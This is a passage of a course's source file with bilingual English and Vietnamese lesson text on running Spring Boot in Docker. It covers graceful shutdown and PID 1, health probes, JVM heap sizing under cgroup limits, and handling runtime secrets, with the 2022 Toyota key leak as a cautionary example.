<h3>4. PID 1 and graceful shutdown</h3>
<p>To stop a container, Docker sends <code>SIGTERM</code> to the process with PID 1 inside it, waits (10 s by default) and then sends <code>SIGKILL</code>. Spring Boot (since 3.4, graceful by default) reacts to <code>SIGTERM</code> by refusing new requests and waiting for running ones, up to <code>spring.lifecycle.timeout-per-shutdown-phase</code> (30 s). Whether that works depends on who PID 1 is. A dev-only endpoint in LabFlow that takes as long as you ask:</p>
${MA172_CHAM}
<p>And a start script of the kind many projects have — note the missing <code>exec</code>:</p>
${MA172_START}
${OUT172_TAT}
<table>
  <thead><tr><th>Run</th><th>PID 1</th><th><code>docker stop</code></th><th>In-flight request</th><th>Exit</th></tr></thead>
  <tbody>
    <tr><td>A. exec form</td><td><code>java</code></td><td>4.6 s</td><td>finished, HTTP 200</td><td>143 (SIGTERM, clean)</td></tr>
    <tr><td>B. exec + <code>server.shutdown=immediate</code></td><td><code>java</code></td><td>0.4 s</td><td>cut: "Empty reply" (curl 52)</td><td>143</td></tr>
    <tr><td>C. <code>start.sh</code> without <code>exec</code></td><td><code>start.sh</code></td><td>10.4 s</td><td>finished only because it was shorter than 10 s</td><td>137 (SIGKILL)</td></tr>
    <tr><td>D. shell-form <code>ENTRYPOINT java …</code></td><td><code>sh</code></td><td>10.6 s</td><td>same as C</td><td>137</td></tr>
    <tr><td>E. exec form, 15 s request</td><td><code>java</code></td><td>10.6 s</td><td>cut at the 10 s deadline</td><td>137</td></tr>
  </tbody>
</table>
<ul>
  <li><strong>A is the goal.</strong> Java is PID 1, receives <code>SIGTERM</code>, logs <code>Commencing graceful shutdown. Waiting for active requests to complete</code>, lets the 5-second request finish with 200, then exits with 143 (128 + 15).</li>
  <li><strong>C and D</strong>: PID 1 is a shell. A process with PID 1 gets no default signal handlers, the shell does not forward <code>SIGTERM</code> to its child, so Java never hears it. There is no "graceful shutdown" line at all: Docker waits its full 10 s and kills everything — exit 137. Here the request happened to finish first; a 12-second report, a half-written file, an un-acknowledged message would not. Fix: exec form <code>ENTRYPOINT ["java", …]</code>, or <code>exec java …</code> as the last line of a script.</li>
  <li><strong>E</strong>: even with everything right, the orchestrator's deadline wins. Make it longer than your slowest request and than <code>spring.lifecycle.timeout-per-shutdown-phase</code>: <code>stop_grace_period</code> in compose (17.4), <code>terminationGracePeriodSeconds</code> in Kubernetes, <code>docker stop -t</code> by hand.</li>
</ul>

<h3>5. Runtime secrets: environment variables or files</h3>
${OUT172_BIMAT}
<ul>
  <li>Environment variables are the simplest runtime mechanism and far better than secrets in the image or in Git. But anyone who can run <code>docker inspect</code> on the host reads them in plain text, they are visible in <code>/proc/1/environ</code> inside the container, and they are inherited by every child process and often dumped into crash reports.</li>
  <li><strong>Files are safer</strong>: Docker/Compose secrets and Kubernetes Secrets mount them under <code>/run/secrets</code> (read-only, in memory). Spring Boot reads a whole folder with <code>spring.config.import=configtree:/run/secrets/</code>: each file name becomes a property name, the file content its value. LabFlow's placeholders (<code>\${LABFLOW_DB_PASSWORD}</code>) resolve from those files without changing a line of code, and <code>docker inspect</code> shows nothing (0 matches).</li>
</ul>

<h3>🕵️ Hacker corner — Toyota T-Connect, 2022</h3>
<p>In October 2022 Toyota disclosed that part of the source code of its T-Connect service had been on a public GitHub repository since December 2017, published by a subcontractor. The code contained an access key to a customer database. For almost five years anyone who found it could reach about 296,000 customer email addresses and customer management numbers. Toyota changed the key in September 2022.</p>
<p>The lesson for your <code>application.properties</code>: a secret that is a literal in a file in the repository is shared with everyone who ever gets the repository — every contractor, every fork, every leaked laptop, forever (Git history keeps it after you delete the line). Keep the placeholder with no default (<code>\${LABFLOW_JWT_SECRET}</code>), inject the value at run time, add a secret scanner to CI (gitleaks — lesson 17.3), and if a key ever lands in a commit, <strong>rotate it</strong>; deleting the commit is not enough.</p>

<h3>Compared with Node.js</h3>
<p>Node reads <code>process.env</code> directly and libraries like <code>dotenv</code> fill it from a file; Spring adds a typed, ordered layer of sources on top (profiles, relaxed binding, <code>configtree</code>). The PID 1 problem is identical — the <a href="/courses/nodejs/learn">Node.js course</a> measures it in lesson 17.3. Memory differs: the JVM sizes its heap from the cgroup limit (25% by default), while in Node you set the V8 heap limit yourself with <code>--max-old-space-size</code>.</p>

<h3>At work</h3>
<p>The first production incident of many Spring Boot teams is "the pod restarts every few hours". The checklist from this lesson finds it in minutes: <code>kubectl describe pod</code> or <code>docker inspect</code> shows <code>OOMKilled</code>; the JVM flags show an <code>-Xmx</code> copied from a developer laptop. The second is "deploys drop a few requests": the image starts Java through a shell script without <code>exec</code>.</p>

<h3>🎤 What the interviewer will ask</h3>
<ol>
  <li><strong>"How does Spring Boot pick a configuration value when several sources define it?"</strong> — Fixed precedence: command line, then environment variables (relaxed binding: <code>SPRING_DATASOURCE_URL</code> ⇒ <code>spring.datasource.url</code>), then profile-specific files, then <code>application.properties</code>. Show <code>/actuator/env</code> (secured) or log the source when debugging.</li>
  <li><strong>"Liveness vs readiness?"</strong> — Liveness: restart me if I am broken. Readiness: do not send me traffic yet. Dependencies belong in neither by default; a database outage should not restart every instance.</li>
  <li><strong>"Your Spring Boot container is OOMKilled. What do you check?"</strong> — Exit 137 + <code>OOMKilled=true</code> means the kernel killed it, not Java. Check <code>-Xmx</code>/<code>MaxRAMPercentage</code> against the limit, leave room for non-heap (metaspace, threads, code cache), add <code>ExitOnOutOfMemoryError</code>, measure with <code>docker stats</code> or Native Memory Tracking.</li>
  <li><strong>"Why do in-flight requests fail during a deploy?"</strong> — Usually PID 1 is a shell that does not forward <code>SIGTERM</code>, so Java is killed after the grace period. Use exec-form <code>ENTRYPOINT</code> or <code>exec java …</code>, keep graceful shutdown on, and make the orchestrator's grace period longer than your slowest request.</li>
  <li><strong>"Environment variables or mounted files for secrets?"</strong> — Both beat secrets in code or images. Files (Docker/Kubernetes secrets + <code>configtree</code>) are not visible in <code>docker inspect</code>, are not inherited by child processes and can be rotated without changing the container definition.</li>
</ol>

<h3>🧪 Practice (40 minutes)</h3>
<div class="callout ok"><ol>
  <li>Run your image with <code>--memory 768m --cpus 1</code> and print <code>MaxHeapSize</code> and the GC in use. Then set <code>MaxRAMPercentage</code> so the heap is about 512 MB. Which GC do you get, and how would you force G1?</li>
  <li>Start LabFlow (or your API) with <code>SPRING_PROFILES_ACTIVE=dev</code>, then set <code>SPRING_PROFILES_ACTIVE=prod</code> through the environment <em>and</em> <code>--spring.profiles.active=dev</code> on the command line. Which profile is active? Prove it from the startup log.</li>
  <li>Change LabFlow's healthcheck to include the database in readiness (<code>management.endpoint.health.group.readiness.include=readinessState,db</code>), stop PostgreSQL for 10 s and watch <code>docker inspect … Health.Status</code>. What would this do with three replicas behind a load balancer?</li>
</ol></div>
${giai('Show the answers', `<p>1. 768 MB × 25% = 192 MB heap and <code>SerialGC</code> (fewer than 2 CPUs). <code>-XX:MaxRAMPercentage=66</code> gives ≈ 507 MB. Force G1 with <code>-XX:+UseG1GC</code> — with one CPU G1 still runs, but its parallel phases have only one thread, which is why the JVM avoids it.</p><p>2. <code>dev</code>: the command line ranks above environment variables. The log line <code>The following 1 profile is active: "dev"</code> proves it.</p><p>3. After the configured retries the container turns <code>unhealthy</code> (Docker itself does not restart it; Compose and Swarm do not either unless you add a tool or use an orchestrator that acts on health). With three replicas sharing one database, all three become unready at the same moment, the load balancer has no target and returns 502/503 for every request, including ones that never touch the database (like cached lab lookups). That is why many teams keep the database out of readiness and alert on <code>/actuator/health</code> instead.</p>`)}

<h3>🗂 Key terms</h3>
<ul>
  <li><strong>Relaxed binding</strong> — Spring's mapping between <code>SPRING_DATASOURCE_URL</code>, <code>spring.datasource.url</code> and other spellings of one property.</li>
  <li><strong>Property source precedence</strong> — the fixed order in which Spring consults command line, environment, profile files and defaults.</li>
  <li><strong>Liveness / readiness probe</strong> — "restart me" vs "send me traffic"; Actuator <code>/actuator/health/liveness</code> and <code>/readiness</code>.</li>
  <li><strong>cgroup limit</strong> — the memory/CPU limit of a container; read by the JVM to size heap and pick a GC.</li>
  <li><strong>MaxRAMPercentage</strong> — heap size as a percentage of the container limit (default 25).</li>
  <li><strong>OOMKilled / exit 137</strong> — the kernel killed the process for exceeding the memory limit (128 + signal 9).</li>
  <li><strong>Graceful shutdown</strong> — on <code>SIGTERM</code>, stop accepting requests, finish running ones, then exit (exit 143 = 128 + signal 15).</li>
  <li><strong>configtree</strong> — Spring Boot config import that turns a folder of files into properties (used with mounted secrets).</li>
</ul>

<h3>📌 Summary</h3>
<ul>
  <li><code>localhost</code> in a container is the container; reach PostgreSQL and Redis by service name.</li>
  <li>Command line &gt; environment &gt; profile files &gt; <code>application.properties</code>; relaxed binding maps <code>SPRING_X_Y</code> to <code>spring.x.y</code>. Set the profile explicitly.</li>
  <li>Healthcheck on readiness; Redis down ⇒ health 503 but readiness 200 and the container stays healthy — on purpose.</li>
  <li>1 GB container ⇒ 256 MB heap and SerialGC by default; <code>-Xmx3g</code> ⇒ silent kernel kill (137); <code>MaxRAMPercentage=75</code> + <code>ExitOnOutOfMemoryError</code> ⇒ clear error, exit 3.</li>
  <li>Exec-form <code>ENTRYPOINT</code> so Java is PID 1 and receives <code>SIGTERM</code>; graceful shutdown finishes in-flight requests.</li>
  <li>Secrets: environment variables at minimum, mounted files + <code>configtree</code> better; never in code — Toyota 2022.</li>
</ul>

<h3>📚 Go deeper</h3>
${tl('https://docs.spring.io/spring-boot/reference/features/external-config.html', '⚙️', 'Spring Boot — Externalized configuration', 'Precedence, relaxed binding, configtree.')}
${tl('https://docs.spring.io/spring-boot/reference/actuator/endpoints.html#actuator.endpoints.kubernetes-probes', '🩺', 'Spring Boot — Kubernetes probes', 'Liveness and readiness groups.')}
${tl('https://docs.spring.io/spring-boot/reference/web/graceful-shutdown.html', '🛑', 'Spring Boot — Graceful shutdown', 'Default since 3.4, timeout per phase.')}
${tl('https://docs.docker.com/reference/dockerfile/#entrypoint', '🐳', 'Dockerfile reference — ENTRYPOINT', 'Exec form vs shell form.')}

<h3>Sources</h3>
<ul>
  <li>Toyota Motor Corporation, notice on possible leak of customer email addresses (T-Connect), 7 October 2022.</li>
  <li>All measurements: LabFlow image on this course's build machine (Docker 29.6.2, eclipse-temurin 21), November 2026.</li>
</ul>
</div>
`;

const L172_VI = `
<div class="ml-vi">
<span class="eyebrow">Chương 17 · Bài 17.2 · Docker và CI</span>
<h2>Cấu hình cho môi trường container</h2>
<p class="lead">Image ở bài 17.1 giống hệt nhau trên laptop của bạn, trong CI và trên máy chủ. Thứ đổi giữa các nơi là cấu hình — CSDL ở đâu, dùng bí mật nào, JVM được lấy bao nhiêu bộ nhớ, tiến trình được báo dừng ra sao. Bài này chạy image LabFlow trong một mạng Docker cạnh PostgreSQL và Redis, và đo năm thứ làm khổ mọi nhóm Spring Boot ngay tuần đầu deploy: <code>localhost</code> bên trong container, nguồn cấu hình nào thắng, healthcheck nên hỏi gì, JVM lấy bao nhiêu heap trong container 1 GB (và đoán sai thì sao), và tín hiệu dừng có tới được Java không.</p>

<h3>Đời thường trước đã</h3>
<p>Một đầu bếp đi nấu ở nhiều nhà hàng mang theo cùng một cuốn công thức (image). Ở mỗi bếp, quản lý ghim lên tường một tấm thẻ: "chợ ở đường Nguyễn Trãi, mã tủ lạnh 4821, bạn có hai bếp lửa" (môi trường). Đầu bếp giỏi đọc tấm thẻ, chứ không hét "chợ ở ngay cạnh!" — điều chỉ đúng ở bếp nhà mình. Và khi quản lý báo "đóng cửa", đầu bếp nấu nốt những đĩa đang trên bếp rồi mới về, chứ không bỏ ngang giữa chừng.</p>

<h3>1. Một image, cấu hình lấy từ môi trường</h3>
${MA172_PROPS}
<p>Mọi giá trị khác nhau giữa các môi trường đều là placeholder <code>\${TÊN:mặc định}</code>. Giá trị mặc định giúp <code>mvn spring-boot:run</code> chạy được trên máy dev; trong container, môi trường cấp giá trị thật. Bí mật JWT cố ý <em>không</em> có mặc định: thiếu nó thì ứng dụng từ chối khởi động, thay vì ký token bằng một giá trị ai cũng đọc được trên GitHub. Chạy cùng một image theo bốn cách (mọi thí nghiệm của bài này, container API vào mạng Docker <code>sb-c17-n</code> cạnh hai container tên <code>db</code> và <code>redis</code>, với <code>--memory 1g --cpus 2</code>, mở ở <code>127.0.0.1:41870</code>):</p>
${OUT172_CFG}
<ul>
  <li><strong>Lần 1</strong>: bên trong container, <code>localhost</code> là chính container đó. PostgreSQL là container khác, gọi tới bằng <strong>tên service</strong> (<code>db</code>) trong mạng Docker chung.</li>
  <li><strong>Lần 3</strong>: <code>SPRING_DATASOURCE_URL</code> thắng dòng trong <code>application.properties</code>. Đây là <em>relaxed binding</em>: Spring ánh xạ biến môi trường sang thuộc tính bằng cách viết thường và đổi <code>_</code> thành <code>.</code> — nên <code>SPRING_DATASOURCE_URL</code> ⇒ <code>spring.datasource.url</code>. Biến môi trường xếp trên tệp cấu hình.</li>
  <li><strong>Lần 4</strong>: đối số dòng lệnh (<code>--spring.datasource.url=…</code>, viết sau tên image) thắng cả biến môi trường.</li>
</ul>
<p>Thứ tự hay gặp trong thực tế, cao nhất trước: đối số dòng lệnh → <code>SPRING_APPLICATION_JSON</code> → biến môi trường của hệ điều hành → <code>application-{profile}.properties</code> → <code>application.properties</code> → giá trị mặc định trong mã. Khi một giá trị bị bỏ qua "bí ẩn", là có ai đó ở tầng cao hơn đã đặt nó.</p>
<div class="callout warn"><p><strong>Một lỗi thật ngay trong bài này.</strong> Thí nghiệm healthcheck bên dưới lần đầu chạy image với cùng CSDL mà các lần chạy profile dev đã dùng, nhưng quên <code>SPRING_PROFILES_ACTIVE=dev</code>:</p>
${OUT172_FLYWAY}
<p>Profile dev thêm một thư mục migration dữ liệu mẫu (<code>db/dev</code>, Chương 18). Chúng đã được áp; thiếu profile, Flyway không tìm thấy chúng ở máy và từ chối khởi động. Đó là Flyway đang bảo vệ bạn — bài học là: mỗi môi trường một CSDL, và profile được đặt rõ ràng trong cấu hình deploy (tệp compose, manifest Kubernetes), không bao giờ để "mặc định là gì thì là".</p></div>

<h3>2. Healthcheck mà bộ điều phối hành động được</h3>
<p>Actuator mở hai probe (bật bằng <code>management.endpoint.health.probes.enabled=true</code>): <strong>liveness</strong> — "tiến trình này hỏng hết cứu chưa? khởi động lại tôi" — và <strong>readiness</strong> — "giờ tôi nhận request được chưa?". Còn <code>/actuator/health</code> tổng thì gộp thêm mọi phụ thuộc Spring biết: CSDL, Redis, ổ đĩa.</p>
${OUT172_HEALTH}
<ul>
  <li>Container đi từ <code>starting</code> sang <code>healthy</code> sau khoảng 21 giây — healthcheck gọi <code>/actuator/health/readiness</code> bằng <code>curl</code>, thứ image <code>eclipse-temurin:21-jre</code> có sẵn.</li>
  <li>Khi dừng Redis, <code>/actuator/health</code> chuyển <code>DOWN</code> (HTTP 503) nhưng readiness vẫn <code>UP</code>, và Docker vẫn giữ container <code>healthy</code>. Đó là thiết kế có chủ ý: khởi động lại API không chữa được Redis, và cache sập không nên kéo sập API (bài 17.4 cho thấy LabFlow vẫn trả lời từ PostgreSQL). Đặt cảnh báo trên <code>/actuator/health</code>; để bộ điều phối hành động theo liveness và readiness.</li>
  <li>Đừng bao giờ trỏ liveness vào một phụ thuộc. CSDL chập chờn một chút là mọi instance bị khởi động lại cùng lúc — biến 5 giây chập chờn thành sập toàn bộ.</li>
</ul>

<h3>3. JVM bên trong một giới hạn bộ nhớ</h3>
<p>Từ Java 10, JVM đọc giới hạn cgroup của container thay vì của máy chủ. Thứ nó quyết định từ đó làm phần lớn mọi người bất ngờ:</p>
${OUT172_MEM}
<ul>
  <li><strong>Heap mặc định = 25% giới hạn.</strong> Trong container 1 GB, ứng dụng Spring Boot của bạn được heap 256 MB và bỏ không 768 MB.</li>
  <li><strong>Dưới 2 CPU hoặc khoảng 1,8 GB, JVM chọn SerialGC</strong> (một luồng, dừng toàn bộ) thay vì G1. Container "nhỏ" lặng lẽ đổi bộ thu gom rác của bạn.</li>
  <li><code>-XX:MaxRAMPercentage=75</code> cho heap 768 MB trong 1 GB và chừa 25% cho mọi thứ <em>không phải</em> heap: metaspace (các lớp đã nạp), ngăn xếp luồng, code cache của JIT, bộ đệm trực tiếp mà tầng mạng dùng.</li>
</ul>
<p>Chuyện gì xảy ra khi cấu hình heap phớt lờ giới hạn? Một chương trình nhỏ cứ giữ thêm từng khối 64 MB:</p>
${MA172_MEM}
${OUT172_OOM}
<ul>
  <li><strong><code>-Xmx3g</code> trong container 1 GB</strong>: JVM tưởng mình có gần 3 GB. Tới 832 MB heap (cộng phần ngoài heap), container chạm 1 GB và <strong>kernel</strong> giết nó: exit 137, <code>OOMKilled=true</code>, không stack trace Java, không một dòng log nói vì sao. Trên production trông nó giống "pod tự khởi động lại lung tung".</li>
  <li><strong><code>MaxRAMPercentage=75</code> + <code>ExitOnOutOfMemoryError</code></strong>: chính JVM báo <code>OutOfMemoryError: Java heap space</code> và thoát với mã 3. Bạn có thông báo rõ ràng, và bộ điều phối khởi động lại một tiến trình không còn ở trạng thái nửa sống nửa chết.</li>
  <li>Buildpacks (17.1) đi xa hơn, tính <code>-Xmx</code> bằng giới hạn trừ phần ngoài heap đo được: 391 MB trong 1 GB. LabFlow dưới tải thật dùng 382 MiB trên giới hạn 1 GiB (Chương 18).</li>
</ul>

<h3>4. PID 1 và tắt êm</h3>
<p>Để dừng container, Docker gửi <code>SIGTERM</code> cho tiến trình PID 1 bên trong, chờ (mặc định 10 giây) rồi gửi <code>SIGKILL</code>. Spring Boot (từ 3.4 mặc định tắt êm) phản ứng với <code>SIGTERM</code> bằng cách từ chối request mới và chờ các request đang chạy, tối đa <code>spring.lifecycle.timeout-per-shutdown-phase</code> (30 giây). Điều đó có chạy hay không phụ thuộc PID 1 là ai. Một endpoint chỉ có ở profile dev của LabFlow, chạy lâu bao nhiêu tuỳ bạn:</p>
${MA172_CHAM}
<p>Và một script khởi động kiểu nhiều dự án vẫn có — để ý thiếu <code>exec</code>:</p>
${MA172_START}
${OUT172_TAT}
<table>
  <thead><tr><th>Lần chạy</th><th>PID 1</th><th><code>docker stop</code></th><th>Request đang chạy</th><th>Exit</th></tr></thead>
  <tbody>
    <tr><td>A. dạng exec</td><td><code>java</code></td><td>4,6 giây</td><td>làm xong, HTTP 200</td><td>143 (SIGTERM, sạch)</td></tr>
    <tr><td>B. exec + <code>server.shutdown=immediate</code></td><td><code>java</code></td><td>0,4 giây</td><td>bị cắt: "Empty reply" (curl 52)</td><td>143</td></tr>
    <tr><td>C. <code>start.sh</code> thiếu <code>exec</code></td><td><code>start.sh</code></td><td>10,4 giây</td><td>xong chỉ vì nó ngắn hơn 10 giây</td><td>137 (SIGKILL)</td></tr>
    <tr><td>D. dạng shell <code>ENTRYPOINT java …</code></td><td><code>sh</code></td><td>10,6 giây</td><td>như C</td><td>137</td></tr>
    <tr><td>E. dạng exec, request 15 giây</td><td><code>java</code></td><td>10,6 giây</td><td>bị cắt ở hạn 10 giây</td><td>137</td></tr>
  </tbody>
</table>
<ul>
  <li><strong>A là đích cần tới.</strong> Java là PID 1, nhận <code>SIGTERM</code>, ghi <code>Commencing graceful shutdown. Waiting for active requests to complete</code>, để request 5 giây làm xong với 200, rồi thoát mã 143 (128 + 15).</li>
  <li><strong>C và D</strong>: PID 1 là một shell. Tiến trình mang PID 1 không có bộ xử lý tín hiệu mặc định, shell không chuyển <code>SIGTERM</code> cho tiến trình con, nên Java không bao giờ nghe thấy. Không hề có dòng "graceful shutdown": Docker chờ đủ 10 giây rồi giết tất cả — exit 137. Ở đây request tình cờ xong trước; một báo cáo chạy 12 giây, một tệp ghi dở, một tin nhắn chưa xác nhận thì không may như vậy. Cách sửa: <code>ENTRYPOINT ["java", …]</code> dạng exec, hoặc <code>exec java …</code> ở dòng cuối script.</li>
  <li><strong>E</strong>: kể cả làm đúng hết, hạn chót của bộ điều phối vẫn thắng. Đặt nó dài hơn request chậm nhất và dài hơn <code>spring.lifecycle.timeout-per-shutdown-phase</code>: <code>stop_grace_period</code> trong compose (17.4), <code>terminationGracePeriodSeconds</code> trong Kubernetes, <code>docker stop -t</code> khi gõ tay.</li>
</ul>

<h3>5. Bí mật lúc chạy: biến môi trường hay tệp</h3>
${OUT172_BIMAT}
<ul>
  <li>Biến môi trường là cơ chế đơn giản nhất và tốt hơn hẳn bí mật trong image hay trong Git. Nhưng ai chạy được <code>docker inspect</code> trên máy chủ đều đọc được nguyên văn, chúng hiện trong <code>/proc/1/environ</code> bên trong container, được mọi tiến trình con thừa hưởng và hay bị đổ vào báo cáo lỗi.</li>
  <li><strong>Tệp an toàn hơn</strong>: secret của Docker/Compose và Secret của Kubernetes gắn chúng vào <code>/run/secrets</code> (chỉ đọc, nằm trong bộ nhớ). Spring Boot đọc cả thư mục bằng <code>spring.config.import=configtree:/run/secrets/</code>: tên tệp thành tên thuộc tính, nội dung tệp thành giá trị. Placeholder của LabFlow (<code>\${LABFLOW_DB_PASSWORD}</code>) lấy giá trị từ các tệp đó mà không sửa dòng mã nào, và <code>docker inspect</code> không thấy gì (0 dòng khớp).</li>
</ul>

<h3>🕵️ Góc hacker — Toyota T-Connect, 2022</h3>
<p>Tháng 10/2022 Toyota công bố một phần mã nguồn dịch vụ T-Connect đã nằm trên một repo GitHub công khai từ tháng 12/2017, do một nhà thầu đăng lên. Trong mã có khoá truy cập vào một CSDL khách hàng. Gần năm năm, ai tìm ra đều có thể chạm tới khoảng 296 000 địa chỉ email và mã quản lý khách hàng. Toyota đổi khoá vào tháng 9/2022.</p>
<p>Bài học cho <code>application.properties</code> của bạn: bí mật viết thẳng trong một tệp của repo là chia sẻ với mọi người từng có repo — mọi nhà thầu, mọi bản fork, mọi laptop bị lộ, mãi mãi (lịch sử Git giữ nó sau khi bạn xoá dòng). Giữ placeholder không có mặc định (<code>\${LABFLOW_JWT_SECRET}</code>), cấp giá trị lúc chạy, thêm công cụ quét bí mật vào CI (gitleaks — bài 17.3), và nếu một khoá lỡ vào commit thì <strong>đổi khoá</strong>; xoá commit là không đủ.</p>

<h3>So với Node.js</h3>
<p>Node đọc thẳng <code>process.env</code> và các thư viện như <code>dotenv</code> điền nó từ một tệp; Spring thêm một tầng nguồn có kiểu, có thứ tự ở trên (profile, relaxed binding, <code>configtree</code>). Vấn đề PID 1 thì y hệt — <a href="/courses/nodejs/learn">khoá Node.js</a> đo nó ở bài 17.3. Bộ nhớ thì khác: JVM tự tính heap từ giới hạn cgroup (mặc định 25%), còn với Node bạn tự đặt giới hạn heap V8 bằng <code>--max-old-space-size</code>.</p>

<h3>Khi đi làm</h3>
<p>Sự cố production đầu tiên của nhiều nhóm Spring Boot là "pod cứ vài giờ lại khởi động lại". Danh sách kiểm của bài này tìm ra nó trong vài phút: <code>kubectl describe pod</code> hoặc <code>docker inspect</code> hiện <code>OOMKilled</code>; cờ JVM cho thấy một <code>-Xmx</code> chép từ laptop của dev. Sự cố thứ hai là "mỗi lần deploy rơi vài request": image khởi động Java qua một script shell không có <code>exec</code>.</p>

<h3>🎤 Phỏng vấn viên sẽ hỏi</h3>
<ol>
  <li><strong>"Spring Boot chọn giá trị cấu hình thế nào khi nhiều nguồn cùng đặt?"</strong> — Thứ tự cố định: dòng lệnh, rồi biến môi trường (relaxed binding: <code>SPRING_DATASOURCE_URL</code> ⇒ <code>spring.datasource.url</code>), rồi tệp theo profile, rồi <code>application.properties</code>. Khi gỡ lỗi thì xem <code>/actuator/env</code> (có bảo vệ) hoặc ghi log nguồn của giá trị.</li>
  <li><strong>"Liveness khác readiness thế nào?"</strong> — Liveness: hỏng thì khởi động lại tôi. Readiness: đừng gửi request cho tôi lúc này. Mặc định không đưa phụ thuộc vào cái nào; CSDL sập không nên làm mọi instance khởi động lại.</li>
  <li><strong>"Container Spring Boot của bạn bị OOMKilled. Bạn kiểm gì?"</strong> — Exit 137 + <code>OOMKilled=true</code> nghĩa là kernel giết, không phải Java. Đối chiếu <code>-Xmx</code>/<code>MaxRAMPercentage</code> với giới hạn, chừa chỗ cho phần ngoài heap (metaspace, luồng, code cache), thêm <code>ExitOnOutOfMemoryError</code>, đo bằng <code>docker stats</code> hoặc Native Memory Tracking.</li>
  <li><strong>"Vì sao request đang chạy bị lỗi lúc deploy?"</strong> — Thường do PID 1 là một shell không chuyển tiếp <code>SIGTERM</code>, nên Java bị giết sau khoảng ân hạn. Dùng <code>ENTRYPOINT</code> dạng exec hoặc <code>exec java …</code>, giữ tắt êm, và đặt khoảng ân hạn của bộ điều phối dài hơn request chậm nhất.</li>
  <li><strong>"Bí mật nên qua biến môi trường hay tệp gắn vào?"</strong> — Cả hai đều hơn bí mật trong mã hay trong image. Tệp (secret của Docker/Kubernetes + <code>configtree</code>) không hiện trong <code>docker inspect</code>, không bị tiến trình con thừa hưởng và đổi được mà không sửa định nghĩa container.</li>
</ol>

<h3>🧪 Thực hành (40 phút)</h3>
<div class="callout ok"><ol>
  <li>Chạy image của bạn với <code>--memory 768m --cpus 1</code> và in <code>MaxHeapSize</code> cùng GC đang dùng. Rồi đặt <code>MaxRAMPercentage</code> để heap khoảng 512 MB. Bạn được GC nào, và ép G1 thế nào?</li>
  <li>Khởi động LabFlow (hoặc API của bạn) với <code>SPRING_PROFILES_ACTIVE=dev</code>, rồi đặt <code>SPRING_PROFILES_ACTIVE=prod</code> qua biến môi trường <em>và</em> <code>--spring.profiles.active=dev</code> trên dòng lệnh. Profile nào đang bật? Chứng minh bằng log khởi động.</li>
  <li>Đổi healthcheck của LabFlow cho readiness gồm cả CSDL (<code>management.endpoint.health.group.readiness.include=readinessState,db</code>), dừng PostgreSQL 10 giây và theo dõi <code>docker inspect … Health.Status</code>. Với ba bản sao sau một bộ cân bằng tải thì chuyện gì xảy ra?</li>
</ol></div>
${giai('Xem đáp án', `<p>1. 768 MB × 25% = heap 192 MB và <code>SerialGC</code> (ít hơn 2 CPU). <code>-XX:MaxRAMPercentage=66</code> cho ≈ 507 MB. Ép G1 bằng <code>-XX:+UseG1GC</code> — với một CPU G1 vẫn chạy, nhưng các pha song song chỉ có một luồng, vì vậy JVM tránh nó.</p><p>2. <code>dev</code>: dòng lệnh xếp trên biến môi trường. Dòng log <code>The following 1 profile is active: "dev"</code> là bằng chứng.</p><p>3. Sau số lần thử đã cấu hình, container thành <code>unhealthy</code> (bản thân Docker không khởi động lại nó; Compose cũng vậy, trừ khi bạn thêm công cụ hoặc dùng bộ điều phối hành động theo health). Với ba bản sao dùng chung một CSDL, cả ba cùng lúc thành chưa sẵn sàng, bộ cân bằng tải không còn đích nào và trả 502/503 cho mọi request, kể cả request không hề chạm CSDL (như tra phòng lab đã có trong cache). Vì vậy nhiều nhóm để CSDL ngoài readiness và đặt cảnh báo trên <code>/actuator/health</code>.</p>`)}

<h3>🗂 Thuật ngữ</h3>
<ul>
  <li><strong>Relaxed binding</strong> — cách Spring ánh xạ giữa <code>SPRING_DATASOURCE_URL</code>, <code>spring.datasource.url</code> và các cách viết khác của một thuộc tính.</li>
  <li><strong>Thứ tự nguồn cấu hình</strong> — thứ tự cố định Spring hỏi dòng lệnh, môi trường, tệp theo profile và mặc định.</li>
  <li><strong>Liveness / readiness probe</strong> — "khởi động lại tôi" và "gửi request cho tôi"; Actuator <code>/actuator/health/liveness</code> và <code>/readiness</code>.</li>
  <li><strong>Giới hạn cgroup</strong> — giới hạn bộ nhớ/CPU của container; JVM đọc nó để tính heap và chọn GC.</li>
  <li><strong>MaxRAMPercentage</strong> — cỡ heap tính theo phần trăm giới hạn container (mặc định 25).</li>
  <li><strong>OOMKilled / exit 137</strong> — kernel giết tiến trình vì vượt giới hạn bộ nhớ (128 + tín hiệu 9).</li>
  <li><strong>Tắt êm (graceful shutdown)</strong> — nhận <code>SIGTERM</code> thì thôi nhận request, làm xong request đang chạy rồi mới thoát (exit 143 = 128 + tín hiệu 15).</li>
  <li><strong>configtree</strong> — cách Spring Boot nhập cấu hình biến một thư mục tệp thành thuộc tính (dùng với secret được gắn vào).</li>
</ul>

<h3>📌 Tóm tắt</h3>
<ul>
  <li><code>localhost</code> trong container là chính container; gọi PostgreSQL và Redis bằng tên service.</li>
  <li>Dòng lệnh &gt; môi trường &gt; tệp theo profile &gt; <code>application.properties</code>; relaxed binding ánh xạ <code>SPRING_X_Y</code> sang <code>spring.x.y</code>. Đặt profile rõ ràng.</li>
  <li>Healthcheck theo readiness; Redis sập ⇒ health 503 nhưng readiness 200 và container vẫn healthy — có chủ ý.</li>
  <li>Container 1 GB ⇒ mặc định heap 256 MB và SerialGC; <code>-Xmx3g</code> ⇒ kernel giết lặng lẽ (137); <code>MaxRAMPercentage=75</code> + <code>ExitOnOutOfMemoryError</code> ⇒ lỗi rõ ràng, exit 3.</li>
  <li><code>ENTRYPOINT</code> dạng exec để Java là PID 1 và nhận <code>SIGTERM</code>; tắt êm làm xong các request đang chạy.</li>
  <li>Bí mật: tối thiểu là biến môi trường, tốt hơn là tệp gắn vào + <code>configtree</code>; không bao giờ nằm trong mã — Toyota 2022.</li>
</ul>

<h3>📚 Học sâu</h3>
${tl('https://docs.spring.io/spring-boot/reference/features/external-config.html', '⚙️', 'Spring Boot — Externalized configuration', 'Thứ tự ưu tiên, relaxed binding, configtree.')}
${tl('https://docs.spring.io/spring-boot/reference/actuator/endpoints.html#actuator.endpoints.kubernetes-probes', '🩺', 'Spring Boot — Kubernetes probes', 'Nhóm liveness và readiness.')}
${tl('https://docs.spring.io/spring-boot/reference/web/graceful-shutdown.html', '🛑', 'Spring Boot — Graceful shutdown', 'Mặc định từ 3.4, thời hạn mỗi pha.')}
${tl('https://docs.docker.com/reference/dockerfile/#entrypoint', '🐳', 'Tham chiếu Dockerfile — ENTRYPOINT', 'Dạng exec và dạng shell.')}

<h3>Nguồn</h3>
<ul>
